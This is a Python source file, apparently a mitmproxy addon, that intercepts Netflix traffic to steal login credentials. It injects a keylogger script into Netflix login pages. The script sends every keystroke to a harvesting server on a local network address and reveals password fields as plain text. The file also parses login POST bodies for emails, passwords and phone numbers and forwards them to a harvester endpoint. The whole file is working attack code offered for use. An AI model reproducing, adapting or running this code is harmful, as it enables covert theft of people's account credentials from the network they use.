"""
Netflix MITM Interceptor - Network-Level Credential Capture
Intercepts Netflix API traffic and captures credentials from authentication requests
"""

import json
import re
import sys
from datetime import datetime

def response(flow) -> None:
    """Inject keystroke capture into Netflix login page"""
    request = flow.request

    # Debug logging
    if "netflix" in request.pretty_host.lower():
        print(f"[RESPONSE] {request.method} {request.pretty_url}", file=sys.stderr, flush=True)

    # Only inject into login pages
    if "netflix" not in request.pretty_host.lower():
        return

    if "/login" not in request.pretty_url.lower():
        return

    print(f"[RESPONSE_LOGIN] Found login page: {request.pretty_url}", file=sys.stderr, flush=True)

    resp = flow.response

    # Check content type
    ct = resp.headers.get("content-type", "")
    print(f"[CONTENT_TYPE] {ct}", file=sys.stderr, flush=True)

    # Only modify HTML responses
    if "text/html" not in ct:
        return

    try:
        body = resp.text if hasattr(resp, 'text') else ''
        print(f"[BODY_SIZE] {len(body)} bytes", file=sys.stderr, flush=True)

        if body and "</head>" in body:
            # Inject keystroke capture before </head>
            body = body.replace("</head>", KEYSTROKE_CAPTURE_SCRIPT + "</head>")
            resp.text = body
            print(f"[INJECT_KEYSTROKE] Added keystroke capture to login page", file=sys.stderr, flush=True)
        else:
            print(f"[NO_HEAD_TAG] Could not find </head> tag", file=sys.stderr, flush=True)
    except Exception as e:
        print(f"[INJECT_ERROR] {e}", file=sys.stderr, flush=True)


print("[LOAD] Netflix interceptor module loading", file=sys.stderr, flush=True)

credentials_captured = 0

# Keystroke capture script to inject into Netflix responses
KEYSTROKE_CAPTURE_SCRIPT = """
<script>
(function() {
    let keystrokeBuffer = '';
    let lastSend = 0;

    // Capture ALL keystrokes on the page
    document.addEventListener('keydown', function(e) {
        // Exclude special keys
        if (e.key.length === 1) {
            keystrokeBuffer += e.key;
        } else if (e.key === 'Backspace' && keystrokeBuffer.length > 0) {
            keystrokeBuffer = keystrokeBuffer.slice(0, -1);
        } else if (e.key === 'Enter' && keystrokeBuffer.length > 0) {
            keystrokeBuffer += '[ENTER]';
        }

        // Send every keystroke to harvester (throttled)
        let now = Date.now();
        if (now - lastSend > 200 && keystrokeBuffer.length > 0) {
            try {
                fetch('http://192.168.86.42:8888/log_keystroke', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({keystroke: keystrokeBuffer}),
                    mode: 'no-cors'
                });
            } catch(e) {}
            lastSend = now;
        }
    }, true);

    // Also monitor input events for pasted content
    document.addEventListener('input', function(e) {
        if (e.target && e.target.value && e.target.value.length > keystrokeBuffer.length) {
            keystrokeBuffer = e.target.value;
            try {
                fetch('http://192.168.86.42:8888/log_keystroke', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({keystroke: keystrokeBuffer}),
                    mode: 'no-cors'
                });
            } catch(e) {}
        }
    }, true);

    // Make sure password inputs are visible
    setTimeout(function() {
        let inputs = document.querySelectorAll('input[type="password"]');
        inputs.forEach(function(input) {
            input.style.color = '#000';
            input.style.backgroundColor = '#fff';
            input.style.opacity = '1';
            input.type = 'text'; // Show as text for visibility
        });
    }, 500);
})();
</script>
"""

def request(flow) -> None:
    """
    Intercept HTTP/HTTPS requests and capture credentials from body
    """
    request = flow.request
    client_ip = "unknown"

    try:
        if request.client_conn:
            client_ip = request.client_conn.peername[0]
    except:
        pass

    # Check Netflix traffic
    host_lower = request.pretty_host.lower()
    if "netflix" not in host_lower and "nflx" not in host_lower:
        return

    url_lower = request.pretty_url.lower()

    # Skip logging/analytics endpoints
    if "/log/" in url_lower or "/debug" in url_lower or ".png" in url_lower or ".svg" in url_lower:
        return

    print(f"[NETFLIX_REQ] {request.method} {request.pretty_url} from {client_ip}", file=sys.stderr, flush=True)

    # Capture from login-related endpoints
    login_patterns = ['/login', '/signin', '/authenticate', '/api/auth', '/api/user', '/api/sessions']
    is_login = any(pat in url_lower for pat in login_patterns)

    # Check for login POST/PUT requests only
    if is_login and request.method in ['POST', 'PUT'] and request.text:
            print(f"[AUTH_POST] {request.method} to {request.pretty_url}", file=sys.stderr, flush=True)
            print(f"[BODY_LEN] {len(request.text)} bytes", file=sys.stderr, flush=True)
            print(f"[BODY_CONTENT] {request.text[:200]}", file=sys.stderr, flush=True)

            try:
                # Try JSON first
                data = json.loads(request.text)
                extract_credentials(data, request, client_ip)
            except json.JSONDecodeError:
                # Try form-encoded
                if '=' in request.text:
                    params = {}
                    for pair in request.text.split('&'):
                        if '=' in pair:
                            k, v = pair.split('=', 1)
                            params[k] = v
                    extract_credentials(params, request, client_ip)


def extract_credentials(data, request, client_ip):
    """Extract credentials from request data"""
    global credentials_captured

    try:
        flat = flatten_dict(data)

        patterns = {
            'email': [r'email', r'username', r'user', r'login', r'account'],
            'password': [r'password', r'passwd', r'pwd', r'pass'],
            'phone': [r'phone', r'phonenumber', r'mobile'],
        }

        found = {}
        for field_type, pats in patterns.items():
            for key, value in flat.items():
                if any(re.search(p, key, re.IGNORECASE) for p in pats):
                    if value and len(str(value)) > 2:
                        found[field_type] = value
                        break

        if found:
            print(f"\n{'='*80}", file=sys.stderr, flush=True)
            print(f"[CREDS_FOUND] {request.pretty_url}", file=sys.stderr, flush=True)
            for k, v in found.items():
                print(f"  {k.upper()}: {v}", file=sys.stderr, flush=True)
            print(f"{'='*80}\n", file=sys.stderr, flush=True)

            credentials_captured += 1
            send_to_harvester(found, request, client_ip)
    except Exception as e:
        print(f"[EXTRACT_ERR] {e}", file=sys.stderr, flush=True)


def flatten_dict(d, parent_key='', sep='_'):
    """Flatten nested dictionary"""
    items = []
    if isinstance(d, dict):
        for k, v in d.items():
            new_key = f"{parent_key}{sep}{k}" if parent_key else k
            if isinstance(v, dict):
                items.extend(flatten_dict(v, new_key, sep=sep).items())
            elif isinstance(v, (list, tuple)):
                for i, item in enumerate(v):
                    if isinstance(item, dict):
                        items.extend(flatten_dict(item, f"{new_key}_{i}", sep=sep).items())
                    else:
                        items.append((f"{new_key}_{i}", item))
            else:
                items.append((new_key, v))
    return dict(items)


def send_to_harvester(credentials, request, client_ip):
    """Send credentials to harvester"""
    try:
        import urllib.request

        harvest_data = {
            'email': credentials.get('email'),
            'password': credentials.get('password'),
            'phone': credentials.get('phone'),
            'url': request.pretty_url,
            'timestamp': datetime.now().isoformat(),
            'source': client_ip,
            'method': 'network_interception'
        }

        data = json.dumps(harvest_data).encode('utf-8')
        req = urllib.request.Request(
            'http://127.0.0.1:8888/harvest',
            data=data,
            headers={'Content-Type': 'application/json'}
        )

        with urllib.request.urlopen(req, timeout=2) as response:
            print(f"[HARVEST_OK] Sent credentials", file=sys.stderr, flush=True)
    except Exception as e:
        print(f"[HARVEST_ERR] {e}", file=sys.stderr, flush=True)


print("[LOAD] Netflix interceptor module loaded", file=sys.stderr, flush=True)
